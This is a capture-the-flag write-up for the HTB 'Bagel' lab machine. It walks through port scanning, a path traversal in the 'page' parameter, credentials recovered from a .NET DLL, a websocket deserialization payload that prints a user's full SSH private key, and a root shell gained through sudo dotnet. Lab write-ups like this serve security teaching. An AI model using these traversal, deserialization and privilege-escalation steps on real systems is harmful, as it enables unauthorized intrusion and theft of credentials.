# Bagel

This is the write-up for the Bagel box from HTB.

# Reconnaissance

First we execute a full port scan on the host.

```jsx
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@kali]-[~/htb/machines/bagel]
╰─ $ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.10.11.201

PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-alt
```

Now we execute a port scan on the open ports.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@kali]-[~/htb/machines/bagel]                                                                                      
╰─ $ sudo nmap -vv -A -Pn -p 22,5000,8000 -oA nmap/bagel 10.10.11.201

PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwHzrBpcTXWKbxBWhc6yfWMiWfWjPmUJv2QqB/c2tJDuGt/97OvgzC+Zs31X/IW2WM6P0rtrKemiz3C5m
UE67k=
|   256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnQ9frzL5hKjBf6oUklfUhQCMFuM0EtdYJOIxUiDuFl
5000/tcp open  upnp?    syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 01 May 2023 15:26:48 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 01 May 2023 15:27:05 GMT
|     Connection: close
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 01 May 2023 15:27:15 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Mon, 01 May 2023 15:26:48 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
8000/tcp open  http-alt syn-ack ttl 63 Werkzeug/2.2.2 Python/3.10.9
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Mon, 01 May 2023 15:26:49 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Mon, 01 May 2023 15:26:43 GMT
Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</
a>. If not, click the link.

```

We have to write the domain in our host’s local file.

# Enumeration

Now we run a brute-force directory on the web server on port 8000.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@kali]-[~/htb/machines/bagel]
╰─ $ gobuster dir -e -u "http://bagel.htb:8000/" -w "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt" -t 40 -x txt,py,json,yml -o gobuster/bagel_root
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bagel.htb:8000/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              yml,txt,py,json
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/05/01 12:01:02 Starting gobuster in directory enumeration mode
===============================================================
http://bagel.htb:8000/orders               (Status: 200) [Size: 267]
```

Accessing the webpage we got.

![Untitled](images/Untitled.png)

# Exploitation

Navigating the web page we found a parameter `page` and we were able to download the /etc/passwd file

![Untitled](images/Untitled%201.png)

![Untitled](images/Untitled%202.png)

Now, we create a loop in order to enumerate the /proc/id/cmdline on the host with some possible process id.

```bash
─[us-free-1]-[10.10.14.74]-[th3g3ntl3m4n@kali]-[~/htb/machines/bagel]
╰─ $ for i in $(seq 900 1000); do curl http://bagel.htb:8000/\?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done

/usr/sbin/abrtd-d-s  PID => 900                                                                                                                             
/usr/sbin/irqbalance--foreground  PID => 901                                                                                                                
/usr/bin/dbus-broker-launch--scopesystem--audit  PID => 902                                                                                                 
File not found  PID => 903                                                                                                                                  
File not found  PID => 904                                                                                                                                  
File not found  PID => 905                                                                                                                                  
/usr/sbin/rsyslogd-n  PID => 906                                                                                                                            
File not found  PID => 907                                                                                                                                  
File not found  PID => 908                                                                                                                                  
File not found  PID => 909                                                                                                                                  
File not found  PID => 910                                                                                                                                  
File not found  PID => 911                                                                                                                                  
File not found  PID => 912                                                                                                                                  
/usr/sbin/rsyslogd-n  PID => 913                                                                                                                            
File not found  PID => 914                                                                                                                                  
dbus-broker--log4--controller9--machine-idce8a2667e5384602a9b46d6ad7614e92--max-bytes536870912--max-fds4096--max-matches131072--audit  PID => 915           
File not found  PID => 916                                                                                                                                  
File not found  PID => 917                                                                                                                                  
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 918                                                                                                     
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 919                                                                                                     
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 920                                                                                                     
File not found  PID => 921                                                                                                                                  
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 922                                                                                                     
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 923                                                                                                     
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 924                                                                                                     
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 925                                                                                                     
File not found  PID => 926                                                                                                                                  
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 927                                                                                                     
File not found  PID => 928                                                                                                                                  
File not found  PID => 929                                                                                                                                  
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 930                                                                                                     
File not found  PID => 931                                                                                                                                  
dotnet/opt/images/bin/Debug/net6.0/bagel.dll  PID => 932                                                                                                     
/usr/sbin/abrtd-d-s  PID => 933
```

We were able to get some processes called bagel.dll. We downloaded it to our local kali machine and use the package pev in order to read DLL files.

```bash
╭─[us-free-1]-[10.10.14.74]-[th3g3ntl3m4n@kali]-[~/htb/machines/bagel]
╰─ $ pestr bagel.dll
...
"Message":"unknown"}                                                                                                                                        
h:mm:ss                                                                                                                                                     
Unauthorized                                                                                                                                                
rder not found!                                                                                                                                             
peration successed                                                                                                                                          
peration failed                                                                                                                                             
opt/images/orders/                                                                                                                                           
orders.txt                                                                                                                                                  
Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K                                                                                  
INSERT INTO orders (Name,Address,Count,Type) VALUES ('Eliot','Street',4,'Baggel')                                                                           
WrapNonExceptionThrows                                                                                                                                      
.NETCoreApp,Version=v6.0                                                                                                                                    
FrameworkDisplayName                                                                                                                                        
bagel                                                                                                                                                       
Debug                                                                                                                                                       
1.0.0.0                                                                                                                                                     
1.0.0                                                                                                                                                       
$bagel_server.Bagel+<StartServer>d__6                                                                                                                       
qThe production team has to decide where the database server will be hosted. This method is not fully implemented.                                          
AllowMultiple                                                                                                                                               
Inherited                                                                                                                                                   
AllowMultiple                                                                                                                                               
Inherited                                                                                                                                                   
RSDS                                                                                                                                                        
/opt/bg1/obj/Debug/net6.0/bagel.pdb
...
```

We found some credentials for user dev, but we couldn’t connect to the SSH service with these credentials. Analyzing the DLL deeper, we found the communication with port 5000.

![Untitled](images/Untitled%203.png)

![Untitled](images/Untitled%204.png)

And some *JSON* serialization codes.

![Untitled](images/Untitled%205.png)

Searching for *WatsonWsServer* we get that this is a web socket technology. Knowing that we code a python script in order to communicate with this Web Socket.

```python
#!/usr/bin/python3

import websocket,json

ws = websocket.WebSocket()
ws.connect("ws://10.10.11.201:5000/")
order = {"UserId": 1, "WriteOrder": "MyOrder", "Test": "Testing"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(result)
```

Executing our script we noticed the order directory has changed to our value in script: MyOrder.

![Untitled](images/Untitled%206.png)

Accessing the /orders endpoint we got.

![Untitled](images/Untitled%207.png)

We could change the data from the order functionality. Knowing that we changed the script to read the private key SSH for user phil where we got accessing `/etc/passwd` file.

![Untitled](images/Untitled%208.png)

We executed the script and we got it.

```python
╭─[us-free-1]-[10.10.14.74]-[th3g3ntl3m4n@kali]-[~/htb/machines/bagel]
╰─ $ python3 ws.py
{
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "8:09:33",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
```

We format the private key properly and access SSH as phil.

```bash
╭─[us-free-1]-[10.10.14.74]-[th3g3ntl3m4n@kali]-[~/htb/machines/images/exploitation/phil]
╰─ $ ssh -i id_rsa phil@bagel.htb
Last login: Sat May  6 07:44:11 2023 from 10.10.16.49
[phil@bagel ~]$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

# Lateral Movement

Knowing the credentials for user developer, we escalate our privilege.

```bash
[phil@bagel ~]$ su developer
Password: 
[developer@bagel phil]$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Running the command `sudo -l` we got.

```bash
[developer@bagel phil]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

We can run `/usr/bin/dotnet` as root without passing the root’s password.

# Privilege Escalation

We are able to abuse the privileges of executing dotnet binary as user root.

[dotnet
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/dotnet/)

Executing dotnet binary using sudo we were able to get a shell as root.

```bash
[developer@bagel phil]$ sudo /usr/bin/dotnet fsi

Microsoft (R) F# Interactive version 12.0.0.0 for F# 6.0
Copyright (c) Microsoft Corporation. All Rights Reserved.

For help type #help;;

> System.Diagnostics.Process.Start("/bin/bash").WaitForExit();;
[root@bagel phil]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```